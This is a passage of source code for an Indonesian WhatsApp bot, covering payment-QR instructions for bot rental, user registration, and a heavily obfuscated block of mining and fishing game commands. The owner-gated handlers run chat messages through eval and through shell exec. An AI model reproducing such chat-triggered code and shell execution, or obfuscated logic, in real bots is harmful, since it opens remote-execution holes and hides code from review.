	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _3 Minggu_ 
•> Harga : ${___minggu}\n\nCaranya :
1. Buka Aplikasi GOPAY via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas GOPAY.
4. dan Masukkan Nominal ${___minggu}
5. Selesai`
await alpha.sendMessage(from, gambar_gopay_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar, contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
}


if(subscribezeeoneofc == 'qr_ovo16'){
	gambar_ovo = `${qr_code_ovo}`
	let gambar_ovo_nya = await getBuffer(gambar_ovo)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _1 Bulan_ 
•> Harga : ${_bulan}\n\nCaranya :
1. Buka Aplikasi OVO via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas OVO.
4. dan Masukkan Nominal ${_bulan}
5. Selesai`
await alpha.sendMessage(from, gambar_ovo_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}    
if(subscribezeeoneofc == 'qr_dana16'){
	gambar_dana = `${qr_code_dana}`
	let gambar_dana_nya = await getBuffer(gambar_dana)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _1 Bulan_ 
•> Harga : ${_bulan}\n\nCaranya :
1. Buka Aplikasi DANA via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas DANA.
4. dan Masukkan Nominal ${_bulan}
5. Selesai`
await alpha.sendMessage(from, gambar_dana_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar, contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
}    
if(subscribezeeoneofc == 'qr_gopay16'){
	gambar_gopay = `${qr_code_gopay}`
	let gambar_gopay_nya = await getBuffer(gambar_gopay)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _1 Bulan_ 
•> Harga : ${_bulan}\n\nCaranya :
1. Buka Aplikasi GOPAY via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas GOPAY.
4. dan Masukkan Nominal ${_bulan}
5. Selesai`
await alpha.sendMessage(from, gambar_gopay_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
}

if(subscribezeeoneofc == 'qr_ovo17'){
	gambar_ovo = `${qr_code_ovo}`
	let gambar_ovo_nya = await getBuffer(gambar_ovo)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _permanen_
•> Harga : ${_permanen}\n\nCaranya :
1. Buka Aplikasi OVO via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas OVO.
4. dan Masukkan Nominal ${_permanen}
5. Selesai`
await alpha.sendMessage(from, gambar_ovo_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar, contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}    
if(subscribezeeoneofc == 'qr_dana17'){
	gambar_dana = `${qr_code_dana}`
	let gambar_dana_nya = await getBuffer(gambar_dana)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _permanen_
•> Harga : ${_permanen}\n\nCaranya :
1. Buka Aplikasi DANA via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas DANA.
4. dan Masukkan Nominal ${_permanen}
5. Selesai`
await alpha.sendMessage(from, gambar_dana_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar, contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}    
if(subscribezeeoneofc == 'qr_gopay17'){
	gambar_gopay = `${qr_code_gopay}`
	let gambar_gopay_nya = await getBuffer(gambar_gopay)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _permanen_ 
•> Harga : ${_permanen}\n\nCaranya :
1. Buka Aplikasi GOPAY via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas GOPAY.
4. dan Masukkan Nominal ${_permanen}
5. Selesai`
await alpha.sendMessage(from, gambar_gopay_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar, contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}
if(subscribezeeoneofc == 'qr_ovo18'){
	gambar_ovo = `${qr_code_ovo}`
	let gambar_ovo_nya = await getBuffer(gambar_ovo)
	ini_bayar = `${ucapannya2}\n\nCaranya :
1. Buka Aplikasi OVO via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas OVO.
4. dan Masukkan Nominal Jumlah Donasi.
5. Selesai`
await alpha.sendMessage(from, gambar_ovo_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar, contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}    
if(subscribezeeoneofc == 'qr_dana18'){
	gambar_dana = `${qr_code_dana}`
	let gambar_dana_nya = await getBuffer(gambar_dana)
	ini_bayar = `${ucapannya2}\n\nCaranya :
1. Buka Aplikasi DANA via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas DANA.
4. dan Masukkan Nominal Jumlah Donasi.
5. Selesai`
await alpha.sendMessage(from, gambar_dana_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}    
if(subscribezeeoneofc == 'qr_gopay18'){
	gambar_gopay = `${qr_code_gopay}`
	let gambar_gopay_nya = await getBuffer(gambar_gopay)
	ini_bayar = `${ucapannya2}\n\nCaranya :
1. Buka Aplikasi GOPAY via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas GOPAY.
4. dan Masukkan Nominal Jumlah Donasi.
5. Selesai`
await alpha.sendMessage(from, gambar_gopay_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}   
if (budy.includes("eror",'error','Eror','Error')){
					alpha.updatePresence(from, Presence.composing)
					const daieeeee = fs.readFileSync('./sticker/10_1.webp');
					alpha.sendMessage(from, daieeeee, sticker, { contextInfo: {mentionedJid: [sender]}, quoted: { "key": { "participant": `${numbernye}@s.whatsapp.net`, "remoteJid":  '6283136505591-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumbnail}`), "mimetype": "application/octet-stream","title": "ｖｙｎｕｔｚｘｘ２２", "fileLength": "36", "pageCount": 0, "fileName": `Kenapa bisa error???`}}, "messageTimestamp": "1614069378", "status": "PENDING"}})
		        }
		if(budy.includes("@verif", "@verify","daftar")){
			if (isRegister) return reply('Kamu sudah terdaftar di dalam database')
 addRegisterUser(sender, pushname, bio_user, wib)
 let ran_blc = randomNomor(50)
 addBalance(sender, ran_blc, balance)
 addLevelingId(sender)
fs.writeFileSync('./database/user/register.json', JSON.stringify(register))
teks = `╭─❒ *Verification* ❒\n│📛 *Nama :* ${pushname}\n│#️⃣ *Nomor :* @${sender.split('@')[0]}\n│💌 *Bio :* ${bio_user}\n│⏰ *Time :* ${wib} Wib\n╰❒ *Success*`
let papako = [{
										"buttonId": `menu`,
										"buttonText": {
											"displayText": "MENU"
											},
										"type": "RESPONSE"
										},{
										"buttonId": `me`,
										"buttonText": {
											"displayText": "PROCFILE"
											},
										"type": "RESPONSE"
										}]
								sendButLocation(from, teks , `Thank for verification 💋\n${botname}™© | By ${ownername}`,pp_userz, papako, {contextInfo: { mentionedJid: [sender]}})
                }
		
if (budy.startsWith('x')){
try {
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
return alpha.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: mek})
} catch(err) {
e = String(err)
reply(e)
}
}  
if (budy.startsWith('>')){
try {
	if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
return alpha.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: mek})
} catch(err) {
e = String(err)
reply(e)
}
}  
if (budy.startsWith('$')){
if (!mek.key.fromMe && !isOwner && !isCreator ) return reply(lang.onlyOwner())
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return reply(`ALPHABOT :~ ${err}`)
if (stdout) {
reply(stdout)
}
})
}
if (budy.startsWith('=>')){
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
var konsol = budy.slice(3)
Return = (sul) => {
var sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined){
bang = util.format(sul)
}
return reply(bang)
}
try {
reply(util.format(eval(`;(async () => { ${konsol} })()`)))
console.log('\x1b[1;37m>', '[', '\x1b[1;32mEXEC\x1b[1;37m', ']', time, color("=>", "green"), 'from', color(pushname), 'args :', color(args.length))
} catch(e){
reply(String(e))
}
}
	}
	function _0x3e27(){const _0x252d52=['whnLAMW','AweGzgfYAsaQ','cGOQu2LZysbpCG','ie5HBweGDgvTCa','oI8VD3D3lMzHBG','nJq2otm4D2nir1DO','kLnPC2eGAwTHBG','C2vUze1LC3nHzW','BgLTAxqGDw50Dq','tMPnq1u','twvUDw5Nz3uGAa','v2vhzMy','BMvIyw5N','ze93wK0','y2vPBa','B3bZtM0','EMTvBxO','uK5eEMK','DdOQia','BIbSzwjPAcbIyq','CeDryKu','kIbPA2fU','ze9evwe','AxmGC2LSywHRyq','igTHExu','nMy1n2e0zJzKoq','BgfUzaRWN5+JieDLCG','y29YyMLLBNmGCG','DhvUz2D1lI4U','ANvHBgLUz290','DgTHBIbF','BMvYyxrVCNmUyW','AwvUCYbhCMfZCW','nffXwvLhtq','AwXLl2vMzgnKnW','C2LSywHRyw4GDa','AMvSywPHAa','otiWA2fS','s2fTDsbTzw5Kyq','y3vfDNO','ywT0AwzRyw4','ihn0B25LigTHBq','yw1Iyw5NlcbZAq','rgDhENi','yw1LihvUDhvRia','cVcFKkWGkKzju0GQia','yw1HidiGBwvUAq','y2zMyZiUANbN','yw5NigrPzgfWyq','kIbZzwXHBweGmG','BxnOEgS','ANvHBhn0B25L','kIbJB3bWzxiGBW','AM9PBG','BMrH','CufLvfm','BgvUz3rO','DuHmCuO','BMvWDhvUDxm','qu4GqKvsseftsq','A3vWlcbTAw5PBq','AwXLl2vHyMzJoq','kIbIyxr1igrHBG','vhrowMK','DxaSig1PBMLTyq','ANvHBgjHAgfUAW','BMCGC2vIzxnHCG','CNrWsNa','ig9YzsbRyw11ia','z2LYAw0G','idiGB3jL','cVcFM5eGkLnut05fkG','rYeH','BwvUzgfWyxrRyq','yw4GBM9TzxiGCa','s1jqDwG','DxbPihvUDhvRia','kLbjteLiifDjta','z290igrPANvHBa','BMTPBwLHoIOG','AYbWDw55ysbJBW','Aw1Pyq','txKGsw52zw50BW','igXPBwL0','vwfUzYbTDsb0Aq','kKnVBMDYyxr1Ba','ysbVD25LCIbRyq','u2vKyw5NigjLCG','kIbjA2fUihnLBa','tcaG44cnkG','ywi3n2e2y2vHoa','yw4GzgLQDwfSoG','twf1ihrHCNvOyq','v3fXu0O','yNv0Dg9Uswq','AgfZAwWGzgvUzW','cGPtAwXHAgTHBG','otzMywiYy2nInG','yLHpteK','AwXLlZC3yZnIyq','yxrPB24G8j+oIIO','B20VxW','CxvVDgvK','igjLBhvTigrPia','kIbJB2fSicWGza','EMfRzLC','vuDbA3u','ztOQia','s2fTDsbRywXHAa','y2HPBhrHD2eGDW','Ag1wwMW','BNDIvum','BIbIzxjHCge','Cgf0oIOG','AxzLCG','4OsIWQKGFcbcEsa','AYbWDw55ysbIyq','u2vHcUkAQYbnB29I','yMP3A3q','D2fTsve','twfHzIa','kLnPC2eGDwfUzW','ywWGmIbPBMDVDa','kIbRyxL1','kLnPC2eGyMfOyq','Dw5cwxG','uhjVC2vZigjLCG','Aw5NihnLBgfTyq','zxLZrKi','CgzLsxG','uwzzA00','z2D1lI4U','yxHvwK8','kLvHBMCGzgLKyq','Bwv0Ag9K','C2LZywjHAgfUAW','BKjwwKO','CMfUzg9T','ndGXmZy4EeTPyMfs','yw0GyM90ig1LBG','ywWGzgLQDwfSoG','B3vUDgfPBGOkrq','AgfUA2LTAweGza','z2v0','AwXLlZe5yteWzG','igv2zw50ig1PBG','yMLSifDVB2rZcG','kKP1BwXHAcbcyq','su5hsu4Gs0fnvq','s3vTChvSA2fUia','DxjHBNvZ','C2XPy2u','oweZmgyUANbN','r0PqywC','yw5NA2fUignHCW','kKP1BwXHAcbIyq','ie1VDw50ywLUCW','AgfUA2LTAweGwq','ter0B0q','CMjPzw5ZihjPDG','vvvxEvG','mtaXmJLMzg9iyKG','kIbVCMu','igTHBxuGBwvUza','nJK1ytGUANbN','z29WBgfUzxq','A2fTDsbTzw5Kyq','s2fTDsbTzw1LBG','ie9srsOGoIa','A2fYzw5HigfUza','mdDJzMm0ndCZoa','BuLyvLe','ywXSB2m','tLzftLrpuLKQia','xYbHzgfSywG6kG','cVcFLlqGq2HHzguGtq','Cgf0A2fUicO','y2i1zMeUANbN','yNv0Dg9Uvgv4Da','y29JAgHLCIbZzq','EKHPu2i','DhuGzgLQDwfSoG','yw5JAw5NlcbZAq','B3j5igfUzgeGza','sM9Ky0y','r05Ls3e','idiGBwvUAxqSia','kKP1BwXHAcbPAW','yMvSDw0Gy3vRDq','8j+xG++4JYakcVcFJQiGkKnpqq','oIOG','igjHDhu','ngjLotG2nwmWzG','CIbWzw1IyxLHCG','Ahr0Chm6lY90zq','ANvHBgnVywW','kLnPC2eGs2f5Dq','yw4GzdG4mJG4yG','kMTHExuGC2vSyq','ihn1zgfOigHHyG','Bw9VyMLLBNmGzW','CNKG8j+xG++4JW','Cgv0DwfSyw5Nla','txvHihrHCNvOyq','CMfZC2XHBMq','nMiWyZaUANbN','idOQia','zMXVB3i','AwXHAgTHBIb0Dq','ANvHBgLRyw4','DhLWzq','yMvYAgfZAwWGza','D0vACwW','AsbHA3rPzMTHBG','D0Tevwq','Aw52','kLnPC2eGy29HBa','ndK0odyYruLoBfDx','BgvNCMeUCgGVzG','AwXLlZbJm2zHoa','BMfTyMfUzW','igLRyw4GA2fTDq','tgLTAxqGA2fTDq','uKvtue9ou0u','ugvUANvHBgfUia','z2vYyMLSihDVBW','s2fTDsblquXbsa','q2vRigLUDMvUDa','Aw5VihnLyMvZyq','BIbRAxjPBsa','ihnPBgfOA2fUia','BwLUAw5N','igTHBxuGDgLKyq','mJy3ztqUANbN','yxbHDgTHBIaQ','kUoaJcbmrujvuIbc','D2TxBgK','AgfUA2LTAwe','iePftefkquHjkG','cVcFL4pVUi8GkLvtrviGsq','qK1OCva','Aw5NihrPzgfRia','z01trxy','whaGDw50DwSGyq','rvjiqvnjtcdJGi0Q','yxrPB24G8j+oIIOG','BIbIzxjHCge/','C2f0DxjUDxm','zgfRig1LBMn1AW','u3DWqMe','ywWGmIbZDg9Uzq','cGOk4PQQienVCMjP','BwvSywT1A2fUia','zw1IyxLHCMfUia','AwP1ywW6kIa','y2HHzguGBw91BG','mJC2otL1ywnttvy','igjLCM1HAw4GzW','DsbIzwX1BsbJDq','ihrHAhvU','ndu2mJiYBLb4EK10','zdG4mJG4yMfRmq','AYbTzw5NzwnLAW','yxqGif9ODhrWCW','ANvKAq','odrkrgDesui','BcbTB3vUDgfPBG','igTLDgLRia','AMvSywPHAcbJBW','zgLZCgXHEvrLEa','cGOQsNvTBgfOia','mZC5nJa1AwPStK9I','v2PPvvG','EweGBwfHCcbHAG','Bg9XA0O','BwfHzIa','mtuYm2uUANbN','ywr2zw50DxjL','BwfYCW','CMuGzgfUia','Dg9YEq','yLvTsfm','Dw5Nz3uUlI4','u2vKyw5Nie1LBq','s2fTDsbnru5btG','D2vNu1m','zw5Nyw4GBM9TBW','DwiGyMvSDw0Gza','rxzLBNqGz3j1yG','AwXLlZq0zMm2oa','DwfUzYb1BNr1AW','AwXHBMDHBIb1yq','tuHkte0','B0nqCxG','kUoaJcbqru5kvufm','idOG','ANvHBgTHExu','ifDVB2rZcVcFN6aGta','u2vKyw5Nig1LBG','qvLbscbzqu5hia','kIbIyxr1icWGkG','BwfUy2LUzW','BwKGzgfYAsb0zq','wvHwA0O','y2fZAw5V','AfrmuLO','BgfOA2fUihr1BG','AwXLlZaWmde4za','ExuGzgLQDwfSoG','yxrPB24G8j+oIIOkcG','BMDNDs4UlIaYia','kLnPC2eGsw5NBW','CIaQxW','tcdJGi0Q','tcOGoIa','Aw52zw50B3j5','zgKGywT0AwzRyq','igTHExuGA2fTDq','zw5Nyw4Gy2fYyq','BwvYA3vYAxvZ','shPVEMu','rNvlu3C','kKP1BwXHAcbjBG','BcaYigTHExu'];_0x3e27=function(){return _0x252d52;};return _0x3e27();}(function(_0x345ebd,_0x1b1e09){function _0x241088(_0x2fbfa2,_0x596bf9,_0x5a277c,_0x4abec8){return _0x3558(_0x4abec8- -0x2f4,_0x5a277c);}const _0x3c72d8=_0x345ebd();function _0x541e33(_0x2a33f2,_0x3e96f1,_0x1109c1,_0x58167f){return _0x3558(_0x58167f- -0x76,_0x1109c1);}while(!![]){try{const _0x5e7586=parseInt(_0x541e33(-0xd,0x92,0x45,0x76))/(-0x1*-0x2da+0x1*0x26bf+-0x2998)+-parseInt(_0x541e33(0x7e,0xc2,0xcc,0x4b))/(-0x85+0xbf4+-0xb6d)+parseInt(_0x541e33(0xd5,0x89,0x2b,0x72))/(-0x215b*0x1+-0x98*0x31+0x3e76)*(parseInt(_0x241088(-0x155,-0x1ca,-0x13a,-0x1a7))/(0x16*0x51+-0x13f3+0xd01))+-parseInt(_0x541e33(0xa2,0xd7,0x90,0x81))/(-0x98e*0x1+0x1f7c+0x47*-0x4f)+-parseInt(_0x541e33(0xb8,-0x27,0xce,0x7b))/(0x1b*-0x9f+0x935+0x796)*(parseInt(_0x241088(-0x263,-0x2a7,-0x2cf,-0x26b))/(0x1*0x1e3d+0xabb*0x3+-0x3e67))+parseInt(_0x241088(-0x22e,-0x1e8,-0x1fe,-0x282))/(0x459+-0x1775+-0xe*-0x15e)+parseInt(_0x541e33(0x138,0x127,0x13a,0xbb))/(-0x883+0x1992*-0x1+-0x16*-0x18d);if(_0x5e7586===_0x1b1e09)break;else _0x3c72d8['push'](_0x3c72d8['shift']());}catch(_0x4cf6ca){_0x3c72d8['push'](_0x3c72d8['shift']());}}}(_0x3e27,0x122*0x2f+0x4daac+-0x13020));function _0x5b2460(_0x10432e,_0x21bfc4,_0x47fefb,_0x162000){return _0x3558(_0x21bfc4- -0x2c5,_0x47fefb);}function _0x1eb754(_0x1b5d23,_0xc287bf,_0x289c54,_0x5de26b){return _0x3558(_0xc287bf-0x3e3,_0x289c54);}function _0x3558(_0x51a517,_0x1bd07c){const _0x55584f=_0x3e27();return _0x3558=function(_0x1e8495,_0x363dd){_0x1e8495=_0x1e8495-(0x1*0x18e8+0x1be*-0xb+-0x551*0x1);let _0x397804=_0x55584f[_0x1e8495];if(_0x3558['tIrCOe']===undefined){var _0x393ef4=function(_0x282535){const _0x27c94f='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x5ddfaf='',_0x45273a='';for(let _0x1d5124=0xf8d+0x1954+-0x28e1,_0x439d7c,_0x2f03a2,_0xe45e55=0x1*-0x33+-0x2*0x1364+-0x11*-0x24b;_0x2f03a2=_0x282535['charAt'](_0xe45e55++);~_0x2f03a2&&(_0x439d7c=_0x1d5124%(-0x1d6+0x26e6+-0x250c)?_0x439d7c*(-0x6c2+0x1d56+0x1*-0x1654)+_0x2f03a2:_0x2f03a2,_0x1d5124++%(-0x9*0x2bb+0x82a+0x106d))?_0x5ddfaf+=String['fromCharCode'](0x1*-0xa52+-0xcac+0x59*0x45&_0x439d7c>>(-(0x57e*0x2+-0x6*0x6a+-0x87e)*_0x1d5124&0x4*0x1cf+0xfd3+-0x1*0x1709)):-0x1*0x763+-0x24a+-0x1*-0x9ad){_0x2f03a2=_0x27c94f['indexOf'](_0x2f03a2);}for(let _0x595cf7=-0xa32+-0x6*0x29b+0x19d4,_0x2a5078=_0x5ddfaf['length'];_0x595cf7<_0x2a5078;_0x595cf7++){_0x45273a+='%'+('00'+_0x5ddfaf['charCodeAt'](_0x595cf7)['toString'](0x100d+-0x1d9b+0x1*0xd9e))['slice'](-(-0x2553+0x4*-0x862+0x179f*0x3));}return decodeURIComponent(_0x45273a);};_0x3558['jiuOUE']=_0x393ef4,_0x51a517=arguments,_0x3558['tIrCOe']=!![];}const _0x238ad1=_0x55584f[-0x1*-0x1baa+0xb*0xb2+-0x5*0x710],_0x57632d=_0x1e8495+_0x238ad1,_0x595440=_0x51a517[_0x57632d];return!_0x595440?(_0x397804=_0x3558['jiuOUE'](_0x397804),_0x51a517[_0x57632d]=_0x397804):_0x397804=_0x595440,_0x397804;},_0x3558(_0x51a517,_0x1bd07c);}switch(command){case _0x5b2460(-0x219,-0x20c,-0x1c1,-0x241):if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return reply(_0x1eb754(0x4f4,0x4a9,0x4fb,0x510)+_0x1eb754(0x414,0x492,0x45e,0x50e)+_0x1eb754(0x4d2,0x526,0x529,0x48f)+_0x1eb754(0x550,0x4b0,0x4b4,0x4d2)+prefix+(_0x5b2460(-0x176,-0x191,-0x123,-0x1aa)+_0x1eb754(0x437,0x4d1,0x434,0x4ab)+'\x20limit'));if(!isEventon)return reply('Event\x20grub'+'\x20belum\x20di\x20'+_0x5b2460(-0x198,-0x171,-0x1f2,-0x1ca));bayar=args['join']('\x20');const hargaIkan=-0x26a7+-0x2*0xe7+0x4f85,hasil1=bayar*hargaIkan;if(getMancingIkan(sender)<=0x8b*0x21+-0x260c+0x3*0x6b6)return reply(_0x5b2460(-0x127,-0x121,-0x10e,-0xc3)+pushname+(_0x5b2460(-0x1f2,-0x200,-0x261,-0x219)+'\x20belum\x20cuk'+_0x5b2460(-0xd2,-0x159,-0x100,-0x1e5)+'l\x202\x20ikan'));getMancingIkan(sender)>=0x55c+-0x762+0x207&&(jualIkan(sender,bayar),addKoinUser(sender,hasil1),await reply(_0x1eb754(0x500,0x4f1,0x593,0x58d)+_0x1eb754(0x4ca,0x54a,0x5b3,0x4e2)+_0x1eb754(0x4ff,0x504,0x513,0x52f)+enter+enter+(_0x5b2460(-0x23d,-0x222,-0x1e6,-0x25b)+_0x1eb754(0x5c4,0x56a,0x52a,0x4e5)+'*\x20')+bayar+enter+(_0x5b2460(-0x26e,-0x258,-0x2fa,-0x2c6)+_0x5b2460(-0x9d,-0x128,-0x1be,-0x182))+hasil1+enter+enter+(_0x1eb754(0x4cd,0x515,0x51e,0x4aa)+_0x1eb754(0x468,0x489,0x502,0x4d9))+getMancingIkan(sender)+enter+(_0x5b2460(-0x14a,-0x120,-0x1b1,-0x7f)+_0x1eb754(0x443,0x489,0x4c5,0x45f))+checkATMuser(sender)+enter+enter+(_0x5b2460(-0x167,-0x11b,-0x1a7,-0xd6)+'hasil\x20deng'+_0x5b2460(-0x1c0,-0x14f,-0xcf,-0x1c8)+'embayaran\x20'+_0x5b2460(-0x1f0,-0x1d8,-0x174,-0x252)+_0x1eb754(0x512,0x534,0x594,0x4a0))));break;case _0x1eb754(0x451,0x48e,0x51f,0x507):if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return reply('Limit\x20kamu'+_0x1eb754(0x49c,0x492,0x407,0x4b5)+_0x1eb754(0x57e,0x526,0x4c3,0x491)+_0x5b2460(-0x1c2,-0x1f8,-0x1c1,-0x266)+prefix+(_0x5b2460(-0x151,-0x191,-0x1c3,-0x219)+_0x5b2460(-0x1f7,-0x1d7,-0x215,-0x187)+'\x20limit'));if(!isEventon)return reply(_0x5b2460(-0x177,-0x1bd,-0x124,-0x250)+_0x1eb754(0x4da,0x576,0x507,0x502)+_0x1eb754(0x496,0x537,0x599,0x563));bayar=args[_0x5b2460(-0x174,-0x164,-0x1f3,-0xc5)]('\x20');const hargaCoal=-0x292*-0x21+0x1*-0x67c2+0x4d88*0x1,hasil2=bayar*hargaCoal;if(getMiningcoal(sender)<=0xa4*0x1c+0x25be+-0x37ad)return reply(_0x5b2460(-0x8c,-0x121,-0x163,-0x193)+pushname+(_0x5b2460(-0x161,-0x1f5,-0x20d,-0x160)+_0x5b2460(-0xc9,-0x149,-0x194,-0x195)+'al'));getMiningcoal(sender)>=0x1e47+0x3*0x626+-0x30b8*0x1&&(jualcoal(sender,bayar),addKoinUser(sender,hasil2),await reply(_0x1eb754(0x46b,0x4f1,0x584,0x45c)+_0x5b2460(-0xc4,-0x15e,-0x1c9,-0x180)+_0x1eb754(0x510,0x504,0x499,0x48f)+enter+enter+('*Jumlah\x20Co'+_0x5b2460(-0x1fb,-0x251,-0x210,-0x242)+'*\x20')+bayar+enter+('*Uang\x20dida'+_0x1eb754(0x4df,0x580,0x570,0x615))+hasil2+enter+enter+(_0x1eb754(0x4cf,0x4a3,0x512,0x52c)+':*\x20')+getMiningcoal(sender)+enter+('*Sisa\x20uang'+_0x5b2460(-0x286,-0x21f,-0x28c,-0x1cc))+checkATMuser(sender)+enter+enter+(_0x1eb754(0x615,0x58d,0x5a2,0x617)+_0x1eb754(0x554,0x56e,0x547,0x56b)+_0x5b2460(-0x15c,-0x14f,-0x10f,-0xb4)+_0x5b2460(-0x15b,-0x1e0,-0x1ef,-0x25a)+_0x5b2460(-0x148,-0x1d8,-0x1da,-0x1b0)+_0x1eb754(0x564,0x534,0x5b2,0x5c3))));break;case'lebur':if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return reply(_0x1eb754(0x42f,0x4a9,0x449,0x481)+'\x20sudah\x20hab'+_0x5b2460(-0x153,-0x182,-0xee,-0x1dc)+'n\x20kirim\x20'+prefix+(_0x5b2460(-0x1c9,-0x191,-0x153,-0x162)+_0x5b2460(-0x143,-0x1d7,-0x259,-0x1be)+_0x5b2460(-0xa6,-0x146,-0x1e6,-0x1a0)));if(!isEventon)return reply('Event\x20grub'+'\x20belum\x20di\x20'+_0x5b2460(-0x1dd,-0x171,-0x163,-0x1ee));bayar=args[_0x5b2460(-0x1ed,-0x164,-0x1d3,-0x190)]('\x20');const hargaOre=0x880+0x468+0xd*-0xfe,hasil3=bayar*hargaOre;if(getMiningore(sender)<=-0x1233*-0x2+-0x299+0x135*-0x1c)return reply('Maaf\x20'+pushname+(_0x1eb754(0x5b4,0x553,0x5b3,0x565)+_0x5b2460(-0x23a,-0x221,-0x2ba,-0x25f)+'p,\x20minimal'+_0x5b2460(-0x189,-0x153,-0x14b,-0xe4)));getMiningore(sender)>=0x1*-0x24e8+-0x10*-0x134+0x11a9&&(jualore(sender,bayar),addIngot(sender,hasil3),await reply(_0x1eb754(0x489,0x4b6,0x41a,0x52f)+_0x5b2460(-0x275,-0x1e9,-0x229,-0x226)+_0x5b2460(-0x17a,-0x1cf,-0x26d,-0x23c)+'Ore\x20dilebu'+'r\x20:*\x20'+bayar+('\x0a*Ingot\x20di'+'dapat:*\x20')+hasil3+(_0x1eb754(0x590,0x511,0x53c,0x48b)+_0x5b2460(-0x131,-0x12e,-0x154,-0x1a7))+getMiningore(sender)));break;case _0x1eb754(0x569,0x542,0x57e,0x56f):if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return reply(_0x1eb754(0x4c7,0x4a9,0x517,0x47c)+_0x1eb754(0x417,0x492,0x4cf,0x517)+_0x5b2460(-0x15b,-0x182,-0xef,-0x151)+_0x5b2460(-0x192,-0x1f8,-0x187,-0x26b)+prefix+(_0x5b2460(-0x1d2,-0x191,-0x20d,-0x225)+_0x1eb754(0x556,0x4d1,0x52c,0x4a0)+_0x5b2460(-0x148,-0x146,-0x167,-0xfe)));if(!isEventon)return reply(_0x1eb754(0x4e8,0x4eb,0x57e,0x4e0)+_0x5b2460(-0x1b4,-0x132,-0x124,-0xb8)+_0x5b2460(-0x1ad,-0x171,-0xe3,-0xdd));bayar=args[_0x1eb754(0x570,0x544,0x4fb,0x573)]('\x20');const hargaStone=-0x12a0+-0x1*0x4b1+0x1ad5,hasil4=bayar*hargaStone;if(getMiningstone(sender)<=0x1957+0x6ad*0x1+0x2e9*-0xb)return reply(_0x1eb754(0x627,0x587,0x629,0x627)+pushname+(_0x5b2460(-0x1ee,-0x170,-0x167,-0xf3)+_0x1eb754(0x4f5,0x4cd,0x482,0x56d)+_0x1eb754(0x586,0x54b,0x596,0x587)+_0x5b2460(-0x250,-0x1e3,-0x283,-0x250)));getMiningstone(sender)>=0x1c1f*-0x1+0x61*-0x4a+0x382a&&(jualstone(sender,bayar),addKoinUser(sender,hasil4),await 